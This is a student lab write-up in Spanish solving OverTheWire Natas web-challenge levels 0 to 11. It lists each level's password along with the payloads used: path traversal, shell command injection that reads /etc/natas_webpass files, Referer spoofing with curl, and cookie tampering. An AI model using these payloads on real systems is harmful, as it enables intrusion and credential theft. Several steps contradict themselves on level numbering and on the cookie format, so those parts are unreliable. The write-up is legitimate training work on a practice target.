@@ -1,0 +1,131 @@
+------------------------------------------- LABORATORIO 2 SIS2330 - NATAS ---------------------------------------------------
+
+Uni. Puña Canaviri Gabriela Katherine
+
+Todos los niveles de Natas se resuelven accediendo desde el navegador:
+
+    http://natasN.natas.labs.overthewire.org
+
+donde "N" va cambiando por nivel. Se inicia sesión con usuario y contraseña.
+
+Para el nivel 0:
+    Usuario: natas0
+    Contraseña: natas0
+
+*Nivel 0 → Nivel 1: 
+    Se inspecciona el código fuente de la página.
+    Se encuentra un comentario HTML que contiene la contraseña.
+
+    comandos:
+    <!-- The password for natas1 is 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq -->
+
+                contraseña 0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq
+
+*Nivel 1 → Nivel 2: 
+    Se inspecciona el código fuente de la página.
+    Se observa una imagen con enlace hacia /files/.
+    Se accede a dicha ruta y se encuentra la contraseña.
+
+    comandos:
+    http://natas1.natas.labs.overthewire.org/files/pistas.txt
+
+                contraseña TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI
+
+*Nivel 2 → Nivel 3: 
+    Se prueba acceder a archivos en /files/.
+    Se encuentra el archivo users.txt que contiene la contraseña.
+
+    comandos:
+    http://natas2.natas.labs.overthewire.org/files/users.txt
+
+                contraseña 3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH
+
+*Nivel 3 → Nivel 4: 
+    Se accede a robots.txt para buscar rutas prohibidas.
+    Se encuentra la ruta /s3cr3t/.
+    Se accede a dicha ruta y se encuentra la contraseña.
+
+    comandos:
+    http://natas3.natas.labs.overthewire.org/robots.txt
+    http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
+
+                contraseña QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+
+*Nivel 4 → Nivel 5: 
+    Se usa la herramienta curl modificando el Referer.
+    Esto permite acceder a la página y obtener la contraseña.
+
+    comandos:
+    curl -H "Referer: http://natas5.natas.labs.overthewire.org/" -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ http://natas4.natas.labs.overthewire.org/
+
+                contraseña 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+
+*Nivel 5 → Nivel 6: 
+    Se modifica el parámetro page en la URL.
+    Se intenta leer el archivo con la contraseña.
+
+    comandos:
+    http://natas6.natas.labs.overthewire.org/?page=../../../../../etc/natas_webpass/natas7
+
+                contraseña 0RoJwHdSKWFTYR5WuiAewauSuNaBXned
+
+*Nivel 6 → Nivel 7: 
+    Se exploran rutas ocultas observadas en el código fuente.
+    Se accede a includes/password.txt donde está la contraseña.
+
+    comandos:
+    http://natas7.natas.labs.overthewire.org/includes/password.txt
+
+                contraseña bmg8SvU1LizuWjx3y7xkNERkHxGre0GS
+
+*Nivel 7 → Nivel 8: 
+    Se decodifica una cadena en base16 y base64.
+    Se obtiene la contraseña.
+
+    comandos:
+    3d3d516343746d4d6d6c315669563362
+    Decodificado en CyberChef.
+
+                contraseña xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q
+
+*Nivel 8 → Nivel 9: 
+    Se utiliza inyección de comandos en el parámetro needle.
+    Se logra leer la contraseña.
+
+    comandos:
+    http://natas9.natas.labs.overthewire.org/?needle=; cat /etc/natas_webpass/natas10&submit=Search
+
+                contraseña ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+
+*Nivel 9 → Nivel 10: 
+    Se utiliza inyección de comandos con bypass de filtro.
+    Se logra leer la contraseña.
+
+    comandos:
+    http://natas10.natas.labs.overthewire.org/?needle=u+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
+
+                contraseña t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
+
+*Nivel 10 → Nivel 11: 
+    Se utiliza un comando con $() o backticks.
+    Se logra leer la contraseña.
+
+    comandos:
+    $(cat /etc/natas_webpass/natas11)
+
+                contraseña UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk
+
+*Nivel 11 → Nivel 12: 
+    Se decodifica la cookie de la sesión (base64).
+    Se modifica el parámetro admin a true.
+    Se recodifica y se reenvía al navegador.
+    La contraseña es mostrada.
+
+    comandos:
+    echo 'Tzo0OiJVc2VyIjozOntzOjU6ImFkbWluIjtiOjA7czo0OiJuYW1lIjtzOjU6Imd1ZXN0IjtzOjY6InZpc2l0cyI7aToxO30=' | base64 -d
+    # modificar admin → true
+    # recodificar con base64
+
+                contraseña yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
+
+
